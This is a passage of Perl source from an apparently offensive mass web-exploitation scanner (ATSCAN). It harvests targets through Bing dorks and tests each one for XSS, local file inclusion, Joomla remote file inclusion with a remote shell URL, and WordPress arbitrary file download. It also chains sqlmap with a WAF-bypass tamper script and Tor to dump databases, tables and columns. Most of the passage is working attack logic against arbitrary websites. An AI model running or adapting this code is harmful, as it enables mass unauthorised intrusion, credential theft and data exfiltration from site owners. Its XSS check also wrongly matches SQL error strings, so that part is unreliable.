  print color 'red';
  print "$Config{osname} ";
  print "$Config{archname}\n";
  print color RESET;
}

sub advise {
  print color 'yellow';
  print "[!] Upss.. Invalid arguments! \n";
  print "[!] Simple Usage: ./",basename($0)," \n";
  print "[!] Command line Usage: ./",basename($0)," <option> \n";
  print "[!] Help: ./",basename($0)," --help \n";
  print color RESET;
  exit;
}

sub forwait {
  print color RESET;
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  print color 'yellow';
  print "[+] Please wait... \n";
  print color RESET;
  print color 'bold blue';
  progressbar();
  print color RESET;
}

sub progressbar {
  use utf8;
  $| = 1;
  binmode STDOUT, ":utf8";
  timer();
  my $poop  = "::";
  for (1..32) {
    select(undef, undef, undef, 0.25);
    print "$poop";
  }
  print" \n\n";
}

sub scandetail {
  if (defined $Target) {
    print color 'bold yellow';
    print "[+] TARGET:: ";
    print color RESET;
    print color 'red';
    print "$Target ";
	if (($Target =~ m/.txt/i) || ($Target=~ m/.log/i)){
	  countinicialtargets();
    }
	print "\n";
    print color RESET;
  }  
  print color 'bold yellow';
  print "[+] PROXY:: ";
  print color RESET;
  if (defined $proxy) {
    print color 'green';
    print "Yes! \n";
    print color RESET;
  }else{
    print color 'red';
    print "No! \n";
    print color RESET;
  }
  if ((defined $mmd5) || (defined $mdecode64) || (defined $mencode64)) {
    print color 'bold yellow';
    print "[+] DECRYPT:: ";
    print color RESET;
    print color 'red';
	if (defined $mmd5) {
      print "MD5\n";
	}elsif (defined $mencode64) {
      print "Encode Base64\n";
	}elsif (defined $mdecode64) {
      print "Decode Base64\n";
	}
    print color RESET;
  }
  if (defined $mlevel) {
    print color 'bold yellow';
    print "[+] SCAN LEVEL:: ";
    print color RESET;
    print color 'red';
    print "$mlevel \n";
    print color RESET;
  }
  if ((defined $mtarget) || (defined $replace) || (defined $with)) {
    print color 'bold yellow';
    print "[+] FILTER:: ";
    print color RESET;
    print color 'red';
    if (defined $mtarget) {
      print "Remove all parameters \n";
    }elsif ((defined $replace) || (defined $with)){
      print "Replace [$replace] with [$with]\n";
	}
    print color RESET;
  }
  if ((defined $sqlmap) || (defined $sqlmaptor)){
    print color 'bold yellow';
    print "[+] EXPLOIT:: ";
    print color RESET;
    print color 'red';
    print "Sqlmap \n";
    print color RESET;
  }
  
  if ((defined $mxss) || (defined $mlfi)){
    print color 'bold yellow';

    print "[+] SCAN:: ";
    print color RESET;
    print color 'red';
    if (defined $mlfi) {
      print "Lfi\n";
    }
    if (defined $mxss) {
      print "Xss\n";
    }
    print color RESET;
  }  

  if ((defined $validation_text) || (defined $misup) || (defined $mhttpd) ) {
    print color 'bold yellow';
    print "[+] VALIDATION:: ";
    print color RESET;
    print color 'red';
    if (defined $validation_text) { 
      print "$validation_text \n";
    }
    if (defined $misup) { 
      print "HTTP/1.1 200\n";
    }
    if (defined $mhttpd) { 
      print "Get Httpd Headers\n";
    }
    print color RESET;
  }
  
  if (defined $exploit) {
    print color 'bold yellow';
    print "[+] EXPLOIT:: ";
    print color RESET;
    print color 'red';
    print "$exploit \n";
    print color RESET;
  }
  
  if (defined $mwpsites) {
    print color 'bold yellow';
    print "[+] LIST:: ";
    print color RESET;
    print color 'red';
    print "Server_sites_Scan.txt \n";
    print color RESET;
  }  

  if ((defined $mjoomrfi) || (defined $mjoomsites) || (defined $mwpsites) || (defined $command) || (defined $mwpadf) || (defined $madmin) || (defined $mwpsites) || (defined $mjoomsites) || (defined $msubdomain) || (defined $mports) || (defined $mzip) || (defined $mupload)) {

    print color 'bold yellow';
    print "[+] EXPLOITATION:: ";
    print color RESET;

    print color 'red';
    if (defined $mjoomrfi) {
      print "Rfi Joomla \n";
    }
    if (defined $command) {
      print "$command \n";
    }
    if (defined $mwpadf) {
      print "ADF Wordpress \n";
    }
    if (defined $madmin) {
      print "Get Admin Page \n";
    }
    if (defined $msites) {
      print "Get Server Sites \n";
    }
    if (defined $msubdomain) {
      print "Get Subdomains \n";
    }
    if (defined $mhttpd) {
      print "Get Httpd Version\n";
    }
    if (defined $mwpsites) {
      print "Get Worpress Sites\n";
    }
    if (defined $mjoomsites) {
      print "Get Joomla Sites\n";
    }
    if (defined $mupload) {
      print "Get Upload Files\n";
    }
    if (defined $mzip) {
      print "Get Zip Files\n";
    }
    if (defined $mports) {
      print "Ports ";
      if (defined $mbasic) {
	    print "Basic Scan ";
      }
      if (defined $mall) {
        print "Complete Scan ";
      }
      if (defined $muser) {
        print "Select Scan ";
      }
	  my $muser=$muser;
	  my $mall=$mall;
	  if ((defined $mbasic and $mbasic eq "udp") || (defined $mall and $mall eq "udp") || (defined $muser and $muser eq "udp")) {
	    print "UDP ";
	  }
	  if ((defined $mbasic and $mbasic eq "tcp") || (defined $mall and $mall eq "tcp") || (defined $muser and $muser eq "tcp")) {
	    print "TCP ";
	  }
      if (((defined $mbasic and $mbasic eq "udp+tcp") || (defined $mall and $mall eq "udp+tcp") || (defined $muser and $muser eq "udp+tcp")) || ((defined $mbasic and $mbasic eq "tcp+udp") || (defined $mall and $mall eq "tcp+udp") || (defined $muser and $muser eq "tcp+udp"))) {
	    print "TCP + UDP";
	  }
      if ((defined $mstart) && (defined $mend)) {
        print "[$mstart To $mend] ";
      }
      print color RESET;
	  print "\n";
    }
  }
  if (defined $shell) {
    print color 'bold yellow';
    print "[+] SHELL:: ";
    print color RESET;
    print color 'red';
    print "$shell \n";
  }
}

##############################################################
##############################################################
sub checkversion {
  $versionck = "version.log";
  if (!-e $versionck) {
    print color 'red';
	print "version.log not exists cannot check version! \n";
	print color RESET;
  }else{
    #my $URL = "http://www.google.com";
   # $request = HTTP::Request->new('GET', $URL);
    #my $response = $ua->request($request);
	#my $html = $response->content;
    #if ($response->is_success) {
	
    my $URL = 'http://github.com/AlisamTechnology/ATSCAN/blob/master/version.log';
    $request = HTTP::Request->new('GET', $URL);
    my $response = $ua->request($request);
	my $html = $response->content;
	  
	  
    (my $gitversion) = ($html =~ /version(.*)Stable/);
    $gitversion = "version".$gitversion."Stable";
  
    open (TEXT, 'version.log');
    while (my $existantversion = <TEXT>) { 
	  chomp $existantversion;
	  if ($gitversion eq $existantversion) {
	    print color 'green';
	    print "OK!$gitversion is the last version!\n";
	    print color RESET;
	  }else{
	    print color 'red';
	    print "$existantversion Update Needed to ";
	    print color RESET;
	    print color 'green';
	    print "$gitversion!\n";
	    print color RESET;
	  }
    }
    close (TEXT);
  }
}

sub testconection {
  my $URL = "http://www.google.com";
  $request = HTTP::Request->new('GET', $URL);
  $response = $ua->request($request);
  if ( !$response->is_success ) {
    print color 'red';
    print "[!] Upss.. Your Internet connection seems not active!\n";
    print "[!] Check Your Connection OR Proxy Setting!\n";
    print color 'RESET';
	exit();
  }
}


sub dorklist {
  $checkdorklist = "dorks.txt";
  if (-e $checkdorklist){ unlink 'dorks.txt'};
  if (defined $dork){
    my $pattern = '.txt|.log';
    if ($dork =~ m/$pattern/i) {
	  use File::Copy qw(copy);
	  copy $dork, 'dorks.txt';
    }else{
	  if ($dork =~ m/,/i) {
        $dork =~ s/,/ /g;
  	  }elsif ($dork =~ m/ /i) {
        $dork =~ s/ /+/g;
	  }
      my @dorks = split / /, $dork;  
      foreach my $dork (@dorks) {
        open (FILE, '>>dorks.txt');
        print FILE "$dork\n";
        close (FILE);
      }
	} 
  }elsif (defined $Target){
	if (-e 'dorks.txt'){ unlink 'dorks.txt'};
    my $pattern = '.txt|.log';
    if ($Target =~ m/$pattern/i) {
	  use File::Copy qw(copy);
	  copy $Target, 'dorks.txt';
    }else{
	  if ($Target =~ m/,/i) {
        $Target =~ s/,/ /g;
  	  }elsif ($Target =~ m/ /i) {
        $Target =~ s/ /+/g;
      }
      my @targets = split / /, $Target;
      foreach my $Target (@targets) {
        open (FILE, '>dorks.txt');
        print FILE "$Target\n";
        close (FILE);
	  }
    }
  }
}

sub targetlist {
  if (defined $Target) {
    my $pattern = '.txt|.log';
    if ($Target =~ m/$pattern/i) {
	  use File::Copy qw(copy);
	  copy $Target, 'search.txt';
    }else{
	  if ($Target =~ m/,/i) {
        $Target =~ s/,/ /g;
  	  }elsif ($Target =~ m/ /i) {
        $Target =~ s/ /+/g;
      }
	  if (-e 'search.txt'){ unlink 'search.txt'};
      my @targets = split / /, $Target;
      foreach my $Target (@targets) {
        open (FILE, '>search.txt');
        print FILE "$Target\n";
        close (FILE);
	  }
    }
  }
}


sub countdorks {
  my $lc = 0;
  my $file = $dork;
  open $file, "<", $dork;
  $lc++ while <$file>;
  print color 'red';
  print "[$lc Dorks(s) Found in the List!]\n";
  print color RESET;
  close $file;
}

sub countinicialtargets {
  my $lc = 0;
  my $file = $Target;
  open $file, "<", $Target;
  $lc++ while <$file>;
  print color 'red';
  print "[$lc Target(s) Found in the List!]";
  print color RESET;
  close $file;
}
sub countsearchlist {
  open $file, "<", "search.txt";
  $lc++ while <$file>;
  return $lc;
}


###################################################################		
###################################################################		
sub finmodule {  
  $list = "scan.txt";
  if (-e $list){  
    print" \n";
    my $lc = 0;
    my $file = "scan.txt";
    my %seen = ();
    {
      local @ARGV = ($file);
      local $^I = '.bac';
      while(<>){
        $seen{$_}++;
        next if $seen{$_} > 1;
        print;
        close (TEXT);
	    unlink "scan.txt.bac";
	  }
    }
    open $file, "<", "scan.txt";
    $lc++ while <$file>;
    print color 'green';
    print "[!] $lc Unique Result(s) Found!\n";
	print color RESET;
    close $file;
	
	if (!defined $sqlmap) {
      print color 'green';
	  if (defined $output) {
	    $listme = "scan.txt";
        use File::Copy qw(copy);
	    copy $listme, $output;
	    unlink 'scan.txt';
	    unlink 'search.txt';
        print "[!] Results saved in $Bin/$output\n";
	  }else{
        print "[!] Results saved in $Bin/scan.txt\n";
	  }
      print color RESET;
      print color 'red';
	  timer();
      print "SCAN FINISHED!\n";
      print color RESET;
	}
  }else{
    negative();
  }	
}

###################################################################		
###################################################################		
sub negative {	
  print color 'red';
  print "[!] No Results Found!\n";
  print color RESET;
  print color 'red';
  timer();
  print "SCAN FINISHED!\n";
  print color RESET;
}
##############################################################
##############################################################
sub submsearch {
  testconection();
  $checksearchscanlist = "search.txt";
  if (-e $checksearchscanlist){ unlink 'search.txt'};
  dorklist();
  msearch();
}
## bgn sub msearch
sub msearch {
    
  my @strings=('fr', 'it', 'ie', 'us', 'br', 'ma', 'dz', 'se', 'nl', 'il', 'ca', 'pt', 'pl', 'eg', 'tn', 'ae', 'qa', 'af', 'iq', 'ch', 'mx', 've', 'es', 'ro', 'ru', 'jp', 'id', 'de', 'ua', 'sa', 'ok', 'fi', 'no', 'cz', 'lu', 'uy');
  $myrand = $strings[int rand @strings];
  scandetail();
  print color 'bold yellow';
  print "[+] RANDOM SEARCH:: ";
  print color RESET;
  print color 'red';
  print "BING [bing.". $myrand . "]\n";
  print color RESET;
  if (defined $dork) {
    print color 'bold yellow';
    print "[+] SEARCH:: ";
    print color RESET;
    print color 'red';
    print "$dork ";
    print color RESET;
	my $pattern = '.txt|.log';
	if ($dork =~ m/$pattern/i){
	  countdorks();
	}else{
      print "\n";
	}
  }
  if (defined $output) {
    print color 'bold yellow';
    print "[+] OUTPUT:: ";
    print color RESET;
    print color 'red';
    print "$output\n";
    print color RESET;
  }
  if ((defined $mip) || (defined $mserver)){
    print color 'bold yellow';
    print "[+] INFO:: ";
    print color RESET;
    print color 'red';
	if (defined $mip){
      print "Get Server IP ";
	}
	if (defined $mserver){
      print "Get Server Software";
	}  
    print color RESET;
	print "\n";
  }
  
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING ENGINE SCAN... \n";
  print color RESET;
  
  forwait();
  open (FILE, "dorks.txt");
  while (my $dork = <FILE>) {
    chomp $dork;
	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $sqlmaptor) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $replace) && (!defined $with) && (!defined $mhttpd)) {
      print color 'bold magenta';
	  timer();
	  print "SCAN:: $dork \n\n";
      print color RESET;
	}
	$mlevel = $mlevel;
    $s_results = $dork;
	if (defined $Target){
      $s_results = "ip%3A".$dork;
      $s_results =~ s/ //g;
	}
    my @scanlist=&scan($s_results);
    sub scan(){
      my @search;
      for($npages=0;$npages<=$mlevel;$npages+=10){
       my $google=("http://www.bing.com/search?q=".$s_results."&first=".$npages."&FORM=PERE&cc=".$myrand);
		my $search=$ua->get("$google");
        $search->as_string;
        my $Res=$search->content;
        while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)/g){
          if($1 !~ /msn|live|bing|microsoft|WindowsLiveTranslator|youtube|google|cache|74.125.153.132|inurl:|q=|404|403|Time|out|Network|Failed|adw.sapo|tripadvisor|yandex/){
            my $URL=$1;
            $URL=~s/&(.*)/\ /g;
			if ((defined $madmin) || (defined $mjoomrfi) || (defined $mwpadf) || (defined $msubdomain) || (defined $mwpsites) || (defined $mjoomsites) || (defined $mtarget) ){
			  $URL =~ s/\/.*//s;
			}elsif (defined $mfulltarget) {
              $URL=~s/&(.*)/\ /g;
			}elsif (defined $mlfi) {
			  $URL =~ s/=.*/=/s;
			}elsif (defined $Target) {
		      if($URL !~ /http:\/\//) { $URL = "$URL"; }
			  if($URL =~ m/www./i) {$URL =~ s/www.//g; }
			  $URL =~ s/\/.*//s;
			}elsif ((!defined $Target) && (((defined $replace) && (defined $with)) && ($URL =~ m/$replace/i))) {
			  $URL =~ s/$replace(.*)/$with/s;
			}else{
              $URL=~s/&(.*)/\ /g;
			}
			if ((defined $mip) || (defined $mserver)) {
			  print color 'bold yellow';
			  print "[!] TARGET: ";
	          print color RESET;
	          print color 'green';
              print "$URL\n";
	          print color RESET;
			  print color 'bold yellow';
	          print "[+] INFO:   ";
	          print color RESET;	
			  if (defined $mip) {
			    use Socket;
                my $checkip=$URL;	 
                $checkip=~ s/\/.*//s;
                $ip = inet_ntoa(inet_aton($checkip));
                print "IP: $ip ";
			  }
			  if (defined $mserver) {
			    if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
			    $request = HTTP::Request->new('GET', $URL);
                my $response = $ua->request($request);
			    print "Server: ";
			    if ($response->is_success) {
                  $serverheader = $response->server;
                  if (defined($serverheader)) {
                    printf("%s", $response->server, " ");
                  }else{ printf("Undefined"); }
                }else{
				  printf("%s", $response->status_line);
				}
			  }
		      print "\n[ ]............................................................................ \n";
			}else{
	          if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $sqlmaptor) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mhttpd) && (!defined $replace) && (!defined $with)) {
			    print color 'bold yellow';
			    print "[!] TARGET: ";
	            print color RESET;
	            print color 'green';
                print "$URL\n";
	            print color RESET;
			    if (defined $mip) {
			      use Socket;
                  my $checkip=$URL;	 
                  $checkip=~ s/\/.*//s;
                  $ip = inet_ntoa(inet_aton($checkip));
                  print color 'bold yellow';
	              print "[+] INFO:   ";
	              print color RESET;	
                  print "IP: $ip ";
			    }
			    if (defined $mserver) {
			      if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
			      $request = HTTP::Request->new('GET', $URL);
                  my $response = $ua->request($request);
			      print "Server: ";
			      if ($response->is_success) {
                    $serverheader = $response->server;
                    if (defined($serverheader)) {
                      printf("%s", $response->server, " ");
                    }else{ printf("Undefined"); }
                  }else{
				    printf("%s", $response->status_line);
				  }
			    }
		        print "[ ]............................................................................ \n";
			  }
			}
            open (TEXT, '>>search.txt');
			if (defined $replace) {
			  if ($URL =~ m/$with/i) {
			    print TEXT "$URL\n";
		      }	
			}else{
              print TEXT "$URL\n";
			}
            close (TEXT);
          }
        }
      }
    }   
  }
  open $file, "<", "search.txt";
  $lc++ while <$file>;
  print color 'yellow';
  print "[!] $lc Total Scan Result(s) Found!\n";
  print color RESET;
  close $file;
  print color RESET;

  $list = "search.txt";
  if (-e $list){
    print" \n";
    my $lc = 0;
	my $file = "search.txt";
    my %seen = ();
    {
      local @ARGV = ($file);
      local $^I = '.bac';
      while(<>){
        $seen{$_}++;
        next if $seen{$_} > 1;
        print;
        close (TEXT);
		unlink "search.txt.bac";
		unlink "dorks.txt";
      }
    }
    open $file, "<", "search.txt";
    $lc++ while <$file>;
	print color 'green';
	print "[!] $lc Unique Result(s) Found!\n";
	print color RESET;
	close $file;
    print color RESET;
	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mhttpd) && (!defined $replace) && (!defined $with)) {
      print color 'green';
	  if (defined $output) {
		if (-e $output){ unlink $output};
	    $listme = "search.txt";
        use File::Copy qw(copy);
	    copy $listme, $output;
	    unlink 'search.txt';
        print "[!] Results saved in $Bin/$output\n";
	  }else{
        print "[!] Results saved in $Bin/search.txt\n";
	  }
      print color RESET;
      print color 'red';
      timer();
      print "SCAN FINISHED!\n";
      print color RESET;
	}else{
	  if (-e 'scan.txt'){ unlink 'scan.txt'};
	  if (defined $output){
	    if (-e $output){ unlink $output};
	  }
	}
  }else{
    print color 'yellow';
    print "[+] No Results Found!\n";
    print color RESET;
    print color 'red';
    timer();
    print "SCAN FINISHED!\n";
    print color RESET;
  }
} ## end sub msearch

###################################################################		
## bgn mxss
sub mxss {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  XSS();
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING XSS SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  $count=0;
  open (TEXT, "search.txt");
  while (my $Target = <TEXT>) {
    $count++;
	chomp $Target;
	my $printarget = $Target;
    if ((defined $replace) && (defined $with)) {
	  if ($Target =~ m/$replace/i) {
		$Target =~ s/$replace(.*)/$with/s;
	  }
    }
	if (defined $exploit) {
	  $Target = $Target.$exploit;
	}
	if (defined $mtarget) {
	  $Target =~ s/\/.*//s;
	}
	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
	print color 'bold magenta';
	timer();
	print "[$count/$lc]\n";
	print color RESET;
	print color 'bold yellow';
	print "[+] TARGET: ";
	print color RESET;
	print color 'yellow';
    print "$printarget \n";
	print color RESET;
	
	foreach $XSS(@XSS){
	  print color 'bold yellow';
	  print "[+] EXPL:   ";
	  print color RESET;
      print "$XSS \n";
		
	  print color 'bold yellow';
	  print "[+] VULN:   ";
	  print color RESET;
      my $URL = $Target.$XSS;
	  $URL =~ s/ //g;
      $request = HTTP::Request->new('GET', $URL);
      my $response = $ua->request($request);
      my $html = $response->content;
	  my $pattern = 'MySQL|syntax|SQL';
	  my $off = 'not found|404|not exist';
	  if(($html =~ m/$pattern/i) && ($html !~ m/$off/i)){
	    print color 'green';
        print "$URL\n";
	    print color RESET;
		open (INFO, '>>scan.txt');
        print INFO "$Target\n";
        close (INFO);
	  }else{
	    print color 'red';
        print "Not Vulnerable! \n";
	    print color RESET;
	  }
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  finmodule();
}
###################################################################		
##bgn sqlmap without tor 
sub sqlmap {
  testconection();
  sleep(1);
  open (INFO, 'scan.txt');
  while (my $Target = <INFO>) {
	chomp $Target;
	$Target =~ s/\%.*//s;
	if (defined $proxy) {
	  my $tor = "--tor --check-tor --tor-type=SOCKS5";
	}else{
	  my $tor = "";
	}
    print color 'bold';
    print "[ ]............................................................................ \n";
    timer();
    print "STARTING SQLMAP...\n";
    print "[ ]............................................................................ \n";
    print color RESET;
	print color 'bold yellow';
	print "[+] TARGET: ";
	print color RESET;
	print color 'yellow';
    print "$Target \n";
	print color RESET;
    print color 'bold yellow';
    print "[+] EXPLOITATION: ";
    print color RESET;
	print "Sqlmap \n\n";
	forwait();
    print color 'yellow';
    print "[+] Checking databases...\n";
    print color RESET;
    system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 $tor --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
		
	### BEG DATABASE
	DATABASE:; 
    print color 'yellow'; 
    print "[+] Do You Want To Exploit DATABASE? (Y/n): ";
    print color RESET;
    $sqldatabase=<STDIN>;
    chomp ($sqldatabase);
		
	if ($sqldatabase =~ /^[Y]?$/i) {
	  DATABASENAME:;
      print color 'yellow';
      print "[+] Enter DataBase Name: ";
      print color RESET;
      $databasename=<STDIN>;
      chomp ($databasename);
	  if (!$databasename){ 
        print color 'red';
	    print "[+] Uppss.. you have to Enter DataBase Name!\n";
        print color RESET;
	    goto DATABASENAME;
      };
      print color 'yellow';
      print "[+] Checking...";
      print color RESET;
      system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 $tor -D $databasename --tables --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");		
	  ### END DATABASE
	  ### BEG TABLES
	  TABLESYES:;
      print color 'yellow'; 
      print "[+] Do You Want To Exploit Tables? (Y/n): ";
      print color RESET;
      $sqltableyes=<STDIN>;
      chomp ($sqltableyes);
		  
	  if ($sqltableyes =~ /^[Y]?$/i) {
		TABLES:;
        print color 'yellow';
        print "[+] Enter Table Name: ";
        print color RESET;
        $sqltables=<STDIN>;
        chomp ($sqltables);
	    if (!$sqltables){ 
          print color 'red';
	      print "[+] Uppss.. you have to Enter Table Name!\n";
          print color RESET;
	      goto TABLES;
        }
        print color 'yellow';
        print "[+] Checking DataBase Tables...";
        print color RESET;
        system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 $tor -D $databasename -T $sqltables --columns --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
		### END TABLES
		### BEG COLUMNS
		COLUMNSYES:;
        print color 'yellow'; 
        print "[+] Do You Want To Exploit Columns? (Y/n): ";
        print color RESET;
        $sqlcolyes=<STDIN>;
        chomp ($sqlcolyes);
	    if ($sqlcolyes =~ /^[Y]?$/i) {
		  COLS:;
          print color 'yellow';
          print "[+] Enter Column Name [ex: admin,users,orders]: ";
          print color RESET;
          $sqlcolumn=<STDIN>;
          chomp ($sqlcolumn);
	      if (!$sqlcolumn){ 
            print color 'red';
	        print "[+] Uppss.. you have to Enter Column Name!\n";
            print color RESET;
	        goto COLS;
          }
          print color 'yellow';
          print "[+] Checking Columns...";
          print color RESET;
          system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 $tor -D $databasename -T $sqltables -C $sqlcolumn --dump --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
	    } ### END COLUMNS
	  }
	}
  }
}
###################################################################		
## bgn mlfi
sub mlfi {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  LFI();
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING LFI SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  $count=0;
  open (TEXT, "search.txt");
  while (my $Target = <TEXT>) {
    $count++;
	chomp $Target;
	my $printarget = $Target;
    if ((defined $replace) && (defined $with)) {
	  if ($Target =~ m/$replace/i) {
		$Target =~ s/$replace(.*)/$with/s;
	  }
    }
	if (defined $exploit) {
	  $Target = $Target.$exploit;
	}
	if (defined $mtarget) {
	  $Target =~ s/\/.*//s;
	}
	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
	print color 'bold magenta';
	timer();
	print "[$count/$lc] LFI SCAN STARTING...\n";
	print color RESET;
	print color 'bold yellow';
	print "[+] TARGET: ";
	print color RESET;
	print color 'yellow';
    print "$printarget \n";
	print color RESET;
	foreach $LFI(@LFI){
	  print color 'bold yellow';
	  print "[+] EXPL:   ";
	  print color RESET;
      print "$LFI \n";
	  print color 'bold yellow';
	  print "[+] VULN:   ";
	  print color RESET;
      my $URL = $Target.$LFI;
	  $URL =~ s/ //g;
      $request = HTTP::Request->new('GET', $URL);
      my $response = $ua->request($request);
      my $html = $response->content;
	  my $pattern = 'root|sbin|nologin';
	  if($html =~ m/$pattern/i) {
	    print color 'green';
        print "$URL\n";
	    print color RESET;
		open (INFO, '>>scan.txt');
        print INFO "$Target\n";
        close (INFO);
	  }else{
	    print color 'red';
        print "Not Vulnerable! \n";
	    print color RESET;
	  }
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  finmodule();
}
###################################################################		
## bgn mjoomrfi
sub mjoomrfi {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  RFI();
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING JOOMLA RFI SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  $count=0;
  open (TEXT, "search.txt");
  while (my $Target = <TEXT>) {
    $count++;
	chomp $Target;
    $Target =~ s/\/.*//s;
	my $printarget = $Target;
    if ((defined $replace) && (defined $with)) {
	  if ($Target =~ m/$replace/i) {
		$Target =~ s/$replace(.*)/$with/s;
	  }
    }
	if (defined $exploit) {
	  $Target = $Target.$exploit;
	}
	if (defined $mtarget) {
	  $Target =~ s/\/.*//s;
	}
	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
	
	print color 'bold magenta';
	timer();
	print "[$count/$lc] JOOMLA RFI SCAN STARTING...\n";
	print color RESET;
	print color 'bold yellow';
	print "[+] TARGET: ";
	print color RESET;
	print color 'yellow';
    print "$printarget \n";
	print color RESET;
	foreach $RFI(@RFI){
      my $URL = $Target.$RFI.$shell;
	  $URL =~ s/ //g;
      $request = HTTP::Request->new('GET', $URL);
      $response = $ua->request($request);
      my $html = $response->content;
	  print color 'bold yellow';
	  print "[+] EXPL:   ";
	  print color RESET;
      print "$RFI \n";
	  print color 'bold yellow';
	  print "[+] SHELL:  ";
	  print color RESET;
      print "$shell \n";
	  print color 'bold yellow';
	  print "[+] VULN:   ";
	  print color RESET;
	  
      my $pattern = 'r57shell|safe_mode|Executed|Shell';
	  if ($html =~ /$pattern/){
	    print color 'green';
        print "$URL\n";
	    print color RESET;
		open (INFO, '>>scan.txt');
        print INFO "$Target\n";
        close (INFO);
	  }else{
	    print color 'red';
        print "Not Vulnerable! \n";
	    print color RESET;
	  }
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  finmodule();
}

###################################################################		
## bgn mwpadf
sub mwpadf {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  ADFWP();
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING WORDPRESS ADF SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  $count=0;
  open (TEXT, "search.txt");
  while (my $Target = <TEXT>) {
    $count++;
	chomp $Target;
    $Target =~ s/\/.*//s;
	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
	
	print color 'bold magenta';
	timer();
	print "[$count/$lc] WORDPRESS ADF SCAN STARTING...\n";
	print color RESET;
	print color 'bold yellow';
	print "[+] TARGET: ";
	print color RESET;
	print color 'yellow';
    print "$Target \n";
	print color RESET;
	foreach $ADFWP(@ADFWP){
      my $URL = $Target.$ADFWP;
	  $URL =~ s/ //g;
      $request = HTTP::Request->new('GET', $URL);
      $response = $ua->request($request);
      my $html = $response->content;
	  
	  print color 'bold yellow';
	  print "[+] EXPL:   ";
	  print color RESET;
      print "$ADFWP \n";
		
	  print color 'bold yellow';
	  print "[+] VULN:   ";
	  print color RESET;

      my $pattern = 'DB_NAME|DB_USER|DB_PASSWORD';
	  if ($response->is_success && $response->content =~ m/$pattern/i) {
	    print color 'green';
        print "$URL\n";
	    print color RESET;
		open (INFO, '>>scan.txt');
        print INFO "$Target\n";
        close (INFO);
	  }else{
	    print color 'red';
        print "Not Vulnerable! \n";
	    print color RESET;
	  }
    }
	print "[ ]............................................................................ \n";
  }
  close(TEXT);
  finmodule();
}

###################################################################		
## bgn madmin
sub madmin {
  if (-e 'scan.txt'){ unlink 'scan.txt';}
  testconection();
  ADMIN();
  if (!defined $mlevel) {
    targetlist();
	scandetail();
    forwait();
  }
  countsearchlist();
  print color 'bold';
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  timer();
  print "STARTING ADMIN PAGE SCAN ...\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print color RESET;
  sleep(2);
  $count=0;
  open (TEXT, "search.txt");
  while (my $Target = <TEXT>) {
    $count++;
	chomp $Target;
	$Target =~ s/\/.*//s;
	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
	
	print color 'bold magenta';
	timer();
	print "[$count/$lc] ADMIN PAGE SCAN STARTING...\n";
	print color RESET;
	print color 'bold yellow';
	print "[+] TARGET: ";
	print color RESET;
	print color 'yellow';
    print "$Target \n";
	print color RESET;
	
